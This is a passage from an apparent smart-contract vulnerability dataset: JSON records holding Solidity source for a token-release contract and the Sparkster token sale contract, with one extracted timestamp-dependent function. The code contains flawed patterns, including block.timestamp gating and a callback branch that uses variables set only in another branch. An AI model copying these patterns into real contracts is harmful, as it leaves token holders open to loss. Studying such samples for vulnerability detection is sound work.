releasedTokens[beneficiary_manage];\n uint256 releasedTokenOfDevelop = releasedTokens[beneficiary_develop];\n uint256 releasedTokenOfMarket = releasedTokens[beneficiary_market];\n uint256 releasedTokenOfFinance = releasedTokens[beneficiary_finance];\n require(releasedTokenOfManage < MANAGE_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfManage.add(MANAGE_CAP_PER_ROUND) <= MANAGE_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfDevelop < DEVELOP_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfDevelop.add(DEVELOP_CAP_PER_ROUND) <= DEVELOP_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfMarket < MARKET_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfMarket.add(MARKET_CAP_PER_ROUND) <= MARKET_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfFinance < FINANCE_CAP_PER_ROUND.mul(_round));\n require(releasedTokenOfFinance.add(FINANCE_CAP_PER_ROUND) <= FINANCE_CAP_PER_ROUND.mul(_round));\n uint256 totalRoundCap = MANAGE_CAP_PER_ROUND.add(DEVELOP_CAP_PER_ROUND).add(MARKET_CAP_PER_ROUND).add(FINANCE_CAP_PER_ROUND);\n require(token.balanceOf(this) >= totalRoundCap);\n token.safeTransfer(beneficiary_manage, MANAGE_CAP_PER_ROUND);\n releasedTokens[beneficiary_manage] = releasedTokens[beneficiary_manage].add(MANAGE_CAP_PER_ROUND);\n token.safeTransfer(beneficiary_develop, DEVELOP_CAP_PER_ROUND);\n releasedTokens[beneficiary_develop] = releasedTokens[beneficiary_develop].add(DEVELOP_CAP_PER_ROUND);\n token.safeTransfer(beneficiary_market, MARKET_CAP_PER_ROUND);\n releasedTokens[beneficiary_market] = releasedTokens[beneficiary_market].add(MARKET_CAP_PER_ROUND);\n token.safeTransfer(beneficiary_finance, FINANCE_CAP_PER_ROUND);\n releasedTokens[beneficiary_finance] = releasedTokens[beneficiary_finance].add(FINANCE_CAP_PER_ROUND);\n }\n function releaseToken() public onlyOwner {\n if (block.timestamp >= fifth_round_release_time) {\n validateReleasedToken(5);\n return;\n }else if (block.timestamp >= forth_round_release_time) {\n validateReleasedToken(4);\n return;\n }else if (block.timestamp >= third_round_release_time) {\n validateReleasedToken(3);\n return;\n }else if (block.timestamp >= second_round_release_time) {\n validateReleasedToken(2);\n return;\n }else if (block.timestamp >= first_round_release_time) {\n validateReleasedToken(1);\n return;\n }\n }\n}",
  "extract_feature": [
    "function releaseToken() public onlyOwner {\nif (block.timestamp >= fifth_round_release_time) {\nvalidateReleasedToken(5);\nreturn;\n}else if (block.timestamp >= forth_round_release_time) {\nvalidateReleasedToken(4);\nreturn;\n}else if (block.timestamp >= third_round_release_time) {\nvalidateReleasedToken(3);\nreturn;\n}else if (block.timestamp >= second_round_release_time) {\nvalidateReleasedToken(2);\nreturn;\n}else if (block.timestamp >= first_round_release_time) {\nvalidateReleasedToken(1);\nreturn;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f11"
  },
  "filename": "6396.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint256 _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint256 _subtractedValue\n )\n public\n returns (bool)\n {\n uint256 oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private pure {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal pure returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function len(bytes32 self) internal pure returns (uint) {\n uint ret;\n if (self == 0)\n return 0;\n if (self & 0xffffffffffffffffffffffffffffffff == 0) {\n ret += 16;\n self = bytes32(uint(self) / 0x100000000000000000000000000000000);\n }\n if (self & 0xffffffffffffffff == 0) {\n ret += 8;\n self = bytes32(uint(self) / 0x10000000000000000);\n }\n if (self & 0xffffffff == 0) {\n ret += 4;\n self = bytes32(uint(self) / 0x100000000);\n }\n if (self & 0xffff == 0) {\n ret += 2;\n self = bytes32(uint(self) / 0x10000);\n }\n if (self & 0xff == 0) {\n ret += 1;\n }\n return 32 - ret;\n }\n function toSliceB32(bytes32 self) internal pure returns (slice ret) {\n assembly {\n let ptr := mload(0x40)\n mstore(0x40, add(ptr, 0x20))\n mstore(ptr, self)\n mstore(add(ret, 0x20), ptr)\n }\n ret._len = len(self);\n }\n function copy(slice self) internal pure returns (slice) {\n return slice(self._len, self._ptr);\n }\n function toString(slice self) internal pure returns (string) {\n string memory ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function len(slice self) internal pure returns (uint l) {\n uint ptr = self._ptr - 31;\n uint end = ptr + self._len;\n for (l = 0; ptr < end; l++) {\n uint8 b;\n assembly { b := and(mload(ptr), 0xFF) }\n if (b < 0x80) {\n ptr += 1;\n } else if(b < 0xE0) {\n ptr += 2;\n } else if(b < 0xF0) {\n ptr += 3;\n } else if(b < 0xF8) {\n ptr += 4;\n } else if(b < 0xFC) {\n ptr += 5;\n } else {\n ptr += 6;\n }\n }\n }\n function empty(slice self) internal pure returns (bool) {\n return self._len == 0;\n }\n function compare(slice self, slice other) internal pure returns (int) {\n uint shortest = self._len;\n if (other._len < self._len)\n shortest = other._len;\n uint selfptr = self._ptr;\n uint otherptr = other._ptr;\n for (uint idx = 0; idx < shortest; idx += 32) {\n uint a;\n uint b;\n assembly {\n a := mload(selfptr)\n b := mload(otherptr)\n }\n if (a != b) {\n uint256 mask = uint256(-1);\n if(shortest < 32) {\n mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n }\n uint256 diff = (a & mask) - (b & mask);\n if (diff != 0)\n return int(diff);\n }\n selfptr += 32;\n otherptr += 32;\n }\n return int(self._len) - int(other._len);\n }\n function equals(slice self, slice other) internal pure returns (bool) {\n return compare(self, other) == 0;\n }\n function nextRune(slice self, slice rune) internal pure returns (slice) {\n rune._ptr = self._ptr;\n if (self._len == 0) {\n rune._len = 0;\n return rune;\n }\n uint l;\n uint b;\n assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n if (b < 0x80) {\n l = 1;\n } else if(b < 0xE0) {\n l = 2;\n } else if(b < 0xF0) {\n l = 3;\n } else {\n l = 4;\n }\n if (l > self._len) {\n rune._len = self._len;\n self._ptr += self._len;\n self._len = 0;\n return rune;\n }\n self._ptr += l;\n self._len -= l;\n rune._len = l;\n return rune;\n }\n function nextRune(slice self) internal pure returns (slice ret) {\n nextRune(self, ret);\n }\n function ord(slice self) internal pure returns (uint ret) {\n if (self._len == 0) {\n return 0;\n }\n uint word;\n uint length;\n uint divisor = 2 ** 248;\n assembly { word:= mload(mload(add(self, 32))) }\n uint b = word / divisor;\n if (b < 0x80) {\n ret = b;\n length = 1;\n } else if(b < 0xE0) {\n ret = b & 0x1F;\n length = 2;\n } else if(b < 0xF0) {\n ret = b & 0x0F;\n length = 3;\n } else {\n ret = b & 0x07;\n length = 4;\n }\n if (length > self._len) {\n return 0;\n }\n for (uint i = 1; i < length; i++) {\n divisor = divisor / 256;\n b = (word / divisor) & 0xFF;\n if (b & 0xC0 != 0x80) {\n return 0;\n }\n ret = (ret * 64) | (b & 0x3F);\n }\n return ret;\n }\n function keccak(slice self) internal pure returns (bytes32 ret) {\n assembly {\n ret := keccak256(mload(add(self, 32)), mload(self))\n }\n }\n function startsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n if (self._ptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function beyond(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n bool equal = true;\n if (self._ptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, length), sha3(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n self._ptr += needle._len;\n }\n return self;\n }\n function endsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n if (selfptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function until(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n bool equal = true;\n if (selfptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n }\n return self;\n }\n event log_bytemask(bytes32 mask);\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr = selfptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n uint end = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr >= end)\n return selfptr + selflen;\n ptr++;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n ptr = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr <= selfptr)\n return selfptr;\n ptr--;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr + needlelen;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr + (selflen - needlelen);\n while (ptr >= selfptr) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr + needlelen;\n ptr -= 1;\n }\n }\n }\n return selfptr;\n }\n function find(slice self, slice needle) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len -= ptr - self._ptr;\n self._ptr = ptr;\n return self;\n }\n function rfind(slice self, slice needle) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len = ptr - self._ptr;\n return self;\n }\n function split(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal pure returns (slice token) {\n split(self, needle, token);\n }\n function rsplit(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = ptr;\n token._len = self._len - (ptr - self._ptr);\n if (ptr == self._ptr) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n }\n return token;\n }\n function rsplit(slice self, slice needle) internal pure returns (slice token) {\n rsplit(self, needle, token);\n }\n function count(slice self, slice needle) internal pure returns (uint cnt) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n cnt++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n function contains(slice self, slice needle) internal pure returns (bool) {\n return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n }\n function concat(slice self, slice other) internal pure returns (string) {\n string memory ret = new string(self._len + other._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n memcpy(retptr + self._len, other._ptr, other._len);\n return ret;\n }\n function join(slice self, slice[] parts) internal pure returns (string) {\n if (parts.length == 0)\n return \"\";\n uint length = self._len * (parts.length - 1);\n for(uint i = 0; i < parts.length; i++)\n length += parts[i]._len;\n string memory ret = new string(length);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n for(i = 0; i < parts.length; i++) {\n memcpy(retptr, parts[i]._ptr, parts[i]._len);\n retptr += parts[i]._len;\n if (i < parts.length - 1) {\n memcpy(retptr, self._ptr, self._len);\n retptr += self._len;\n }\n }\n return ret;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity 0.4.24;\ncontract SparksterToken is StandardToken, Ownable{\n using strings for *;\n using SafeMath for uint256;\n struct Member {\n mapping(uint256 => uint256) weiBalance;\n mapping(uint256 => uint256) tokenBalance;\n int256 transferred;\n bool exists;\n }\n struct Group {\n bool distributed;\n bool distributing;\n bool unlocked;\n uint256 ratio;\n uint256 startTime;\n uint256 phase1endTime;\n uint256 phase2endTime;\n uint256 deadline;\n uint256 max2;\n uint256 max3;\n uint256 weiTotal;\n uint256 cap;\n uint256 howManyDistributed;\n uint256 howManyTotal;\n }\n address oracleAddress = 0xCb3405Fd5212C8B6a16DeFf9eBa49E69478A61b8;\n bool public transferLock = true;\n bool public allowedToSell = false;\n bool public allowedToPurchase = false;\n string public name;\n string public symbol;\n uint8 public decimals;\n uint256 public penalty;\n uint256 public maxGasPrice;\n uint256 internal nextGroupNumber;\n uint256 public sellPrice;\n address[] internal allMembers;\n address[] internal allNonMembers;\n mapping(address => bool) internal nonMemberTransfers;\n mapping(address => Member) internal members;\n mapping(uint256 => Group) internal groups;\n uint256 public openGroupNumber;\n event WantsToPurchase(address walletAddress, uint256 weiAmount, uint256 groupNumber, bool inPhase1);\n event WantsToDistribute(uint256 groupNumber, uint256 startIndex, uint256 endIndex);\n event NearingHardCap(uint256 groupNumber, uint256 remainder);\n event ReachedHardCap(uint256 groupNumber);\n event DistributeDone(uint256 groupNumber);\n event UnlockDone(uint256 groupNumber);\n event GroupCreated(uint256 groupNumber, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio);\n event AddToGroup(address walletAddress, uint256 groupNumber);\n event ChangedAllowedToSell(bool allowedToSell);\n event ChangedAllowedToPurchase(bool allowedToPurchase);\n event ChangedTransferLock(bool transferLock);\n event SetSellPrice(uint256 sellPrice);\n event SplitTokens(uint256 splitFactor);\n event ReverseSplitTokens(uint256 splitFactor);\n modifier onlyOracleBackend() {\n require(msg.sender == oracleAddress);\n _;\n }\n modifier onlyPayloadSize(uint size) {\n require(msg.data.length == size + 4);\n _;\n }\n modifier canTransfer() {\n require(!transferLock);\n _;\n }\n modifier canPurchase() {\n require(allowedToPurchase);\n _;\n }\n modifier canSell() {\n require(allowedToSell);\n _;\n }\n function() public payable {\n purchase();\n }\n constructor() public {\n name = \"Sparkster\";\n decimals = 18;\n symbol = \"SPRK\";\n setMaximumGasPrice(40);\n mintTokens(435000000);\n }\n function setOracleAddress(address newAddress) public onlyOwner returns(bool success) {\n oracleAddress = newAddress;\n return true;\n }\n function setMaximumGasPrice(uint256 gweiPrice) public onlyOwner returns(bool success) {\n maxGasPrice = gweiPrice.mul(10**9);\n return true;\n }\n function parseAddr(string _a) pure internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function parseInt(string _a, uint _b) pure internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decim = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decim) {\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decim = true;\n }\n return mint;\n }\n function mintTokens(uint256 amount) public onlyOwner {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n totalSupply_ = totalSupply_.add(decimalAmount);\n balances[msg.sender] = balances[msg.sender].add(decimalAmount);\n emit Transfer(address(0), msg.sender, decimalAmount);\n }\n function purchase() public canPurchase payable returns(bool success) {\n require(msg.sender != address(0));\n Member storage memberRecord = members[msg.sender];\n Group storage openGroup = groups[openGroupNumber];\n require(openGroup.ratio > 0);\n uint256 currentTimestamp = block.timestamp;\n require(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\n require(!openGroup.distributing && !openGroup.distributed);\n require(tx.gasprice <= maxGasPrice);\n uint256 weiAmount = msg.value;\n require(weiAmount >= 0.1 ether);\n uint256 weiTotal = openGroup.weiTotal.add(weiAmount);\n require(weiTotal <= openGroup.cap);\n uint256 userWeiTotal = memberRecord.weiBalance[openGroupNumber].add(weiAmount);\n if(currentTimestamp <= openGroup.phase1endTime){\n emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, true);\n return true;\n } else if (currentTimestamp <= openGroup.phase2endTime) {\n require(userWeiTotal <= openGroup.max2);\n emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);\n return true;\n } else {\n require(userWeiTotal <= openGroup.max3);\n emit WantsToPurchase(msg.sender, weiAmount, openGroupNumber, false);\n return true;\n }\n }\n function purchaseCallback(string uploadedData) public onlyOracleBackend returns(bool success) {\n strings.slice memory uploadedSlice = uploadedData.toSlice();\n strings.slice memory nextRecord = \"\".toSlice();\n strings.slice memory nextDatum = \"\".toSlice();\n strings.slice memory recordSeparator = \"|\".toSlice();\n strings.slice memory datumSeparator = \":\".toSlice();\n uint256 amountForOwner = 0;\n while (!uploadedSlice.empty()) {\n nextRecord = uploadedSlice.split(recordSeparator);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 accepted = parseInt(nextDatum.toString(), 0);\n nextDatum = nextRecord.split(datumSeparator);\n address theAddress = parseAddr(nextDatum.toString());\n if (accepted > 0) {\n Member storage memberRecord = members[theAddress];\n nextDatum = nextRecord.split(datumSeparator);\n uint256 weiAmount = parseInt(nextDatum.toString(), 0);\n amountForOwner = amountForOwner.add(weiAmount);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 groupNumber = parseInt(nextDatum.toString(), 0);\n Group storage theGroup = groups[groupNumber];\n uint256 tokenAmount = weiAmount.mul(theGroup.ratio);\n theGroup.weiTotal = theGroup.weiTotal.add(weiAmount);\n memberRecord.weiBalance[groupNumber] = memberRecord.weiBalance[groupNumber].add(weiAmount);\n memberRecord.tokenBalance[groupNumber] = memberRecord.tokenBalance[groupNumber].add(tokenAmount);\n balances[owner] = balances[owner].sub(tokenAmount);\n if (!memberRecord.exists) {\n allMembers.push(theAddress);\n memberRecord.exists = true;\n if (balances[theAddress] > 0) {\n memberRecord.transferred = -int(balances[theAddress]);\n }\n }\n } else {\n if (penalty >= weiAmount) {\n amountForOwner = amountForOwner.add(penalty);\n weiAmount = weiAmount.sub(penalty);\n }\n if (address(this).balance >= weiAmount) {\n theAddress.transfer(weiAmount);\n }\n }\n if (internalGetHowMuchUntilHardCap(groupNumber) <= 100 ether) {\n emit NearingHardCap(groupNumber, internalGetHowMuchUntilHardCap(groupNumber));\n }\n if (theGroup.weiTotal == theGroup.cap) {\n emit ReachedHardCap(groupNumber);\n }\n }\n if (address(this).balance >= amountForOwner) {\n owner.transfer(amountForOwner);\n }\n return true;\n }\n function drain() public onlyOwner {\n owner.transfer(address(this).balance);\n }\n function setPenalty(uint256 newPenalty) public onlyOwner returns(bool success) {\n penalty = newPenalty;\n return true;\n }\n function sell(uint256 amount) public canSell {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n Member storage theMember = members[msg.sender];\n if (theMember.exists) {\n int256 sellValue = theMember.transferred + int(decimalAmount);\n require(sellValue >= theMember.transferred);\n require(sellValue <= int(getUnlockedBalanceLimit(msg.sender)));\n theMember.transferred = sellValue;\n }\n balances[msg.sender] = balances[msg.sender].sub(decimalAmount);\n uint256 totalCost = amount.mul(sellPrice);\n require(address(this).balance >= totalCost);\n balances[owner] = balances[owner].add(decimalAmount);\n msg.sender.transfer(totalCost);\n emit Transfer(msg.sender, owner, decimalAmount);\n }\n function fundContract() public onlyOwner payable {\n }\n function setSellPrice(uint256 thePrice) public onlyOwner {\n sellPrice = thePrice;\n emit SetSellPrice(sellPrice);\n }\n function setAllowedToSell(bool value) public onlyOwner {\n allowedToSell = value;\n emit ChangedAllowedToSell(allowedToSell);\n }\n function setAllowedToPurchase(bool value) public onlyOwner {\n allowedToPurchase = value;\n emit ChangedAllowedToPurchase(allowedToPurchase);\n }\n function createGroup(uint256 startEpoch, uint256 phase1endEpoch, uint256 phase2endEpoch, uint256 deadlineEpoch, uint256 phase2cap, uint256 phase3cap, uint256 etherCap, uint256 ratio) public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n Group storage theGroup = groups[nextGroupNumber];\n theGroup.startTime = startEpoch;\n theGroup.phase1endTime = phase1endEpoch;\n theGroup.phase2endTime = phase2endEpoch;\n theGroup.deadline = deadlineEpoch;\n theGroup.max2 = phase2cap;\n theGroup.max3 = phase3cap;\n theGroup.cap = etherCap;\n theGroup.ratio = ratio;\n createdGroupNumber = nextGroupNumber;\n nextGroupNumber++;\n success = true;\n emit GroupCreated(createdGroupNumber, startEpoch, phase1endEpoch, phase2endEpoch, deadlineEpoch, phase2cap, phase3cap, etherCap, ratio);\n }\n function createGroup() public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n return createGroup(0, 0, 0, 0, 0, 0, 0, 0);\n }\n function getGroup(uint256 groupNumber) public view returns(bool distributed, bool unlocked, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 weiTotal, uint256 howManyDistributed) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n distributed = theGroup.distributed;\n unlocked = theGroup.unlocked;\n phase2cap = theGroup.max2;\n phase3cap = theGroup.max3;\n cap = theGroup.cap;\n ratio = theGroup.ratio;\n startTime = theGroup.startTime;\n phase1endTime = theGroup.phase1endTime;\n phase2endTime = theGroup.phase2endTime;\n deadline = theGroup.deadline;\n weiTotal = theGroup.weiTotal;\n howManyDistributed = theGroup.howManyDistributed;\n }\n function internalGetHowMuchUntilHardCap(uint256 groupNumber) internal view returns(uint256 remainder) {\n return groups[groupNumber].cap.sub(groups[groupNumber].weiTotal);\n }\n function getHowMuchUntilHardCap() public view returns(uint256 remainder) {\n return internalGetHowMuchUntilHardCap(openGroupNumber);\n }\n function getHowManyLeftToDistribute(uint256 groupNumber) public view returns(uint256 howManyLeftToDistribute) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n howManyLeftToDistribute = theGroup.howManyTotal - theGroup.howManyDistributed;\n }\n function addMemberToGroup(address walletAddress, uint256 groupNumber) public onlyOwner returns(bool success) {\n emit AddToGroup(walletAddress, groupNumber);\n return true;\n }\n function distribute(uint256 groupNumber, uint256 howMany) public onlyOwner {\n Group storage theGroup = groups[groupNumber];\n require(groupNumber < nextGroupNumber && !theGroup.distributed);\n emit WantsToDistribute(groupNumber, theGroup.howManyDistributed, theGroup.howManyDistributed + howMany);\n }\n function distributeCallback(uint256 groupNumber, uint256 totalInGroup, address[] addresses) public onlyOracleBackend returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n theGroup.distributing = true;\n uint256 n = addresses.length;\n theGroup.howManyTotal = totalInGroup;\n for (uint256 i = 0; i < n; i++) {\n address memberAddress = addresses[i];\n Member storage currentMember = members[memberAddress];\n uint256 balance = currentMember.tokenBalance[groupNumber];\n if (balance > 0) {\n balances[memberAddress] = balances[memberAddress].add(balance);\n emit Transfer(owner, memberAddress, balance);\n }\n }\n theGroup.howManyDistributed = theGroup.howManyDistributed.add(n);\n if (theGroup.howManyDistributed == theGroup.howManyTotal) {\n theGroup.distributed = true;\n theGroup.distributing = false;\n emit DistributeDone(groupNumber);\n }\n return true;\n }\n function getUnlockedBalanceLimit(address walletAddress) internal view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n for (uint256 i = 0; i < nextGroupNumber; i++) {\n if (groups[i].unlocked) {\n balance = balance.add(theMember.tokenBalance[i]);\n }\n }\n return balance;\n }\n function getUnlockedTokens(address walletAddress) public view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n return uint256(int(getUnlockedBalanceLimit(walletAddress)) - theMember.transferred);\n }\n function unlock(uint256 groupNumber) public onlyOwner returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n require(theGroup.distributed);\n theGroup.unlocked = true;\n emit UnlockDone(groupNumber);\n return true;\n }\n function setTransferLock(bool value) public onlyOwner {\n transferLock = value;\n emit ChangedTransferLock(transferLock);\n }\n function burn(uint256 amount) public onlyOwner {\n balances[msg.sender] = balances[msg.sender].sub(amount);\n totalSupply_ = totalSupply_.sub(amount);\n 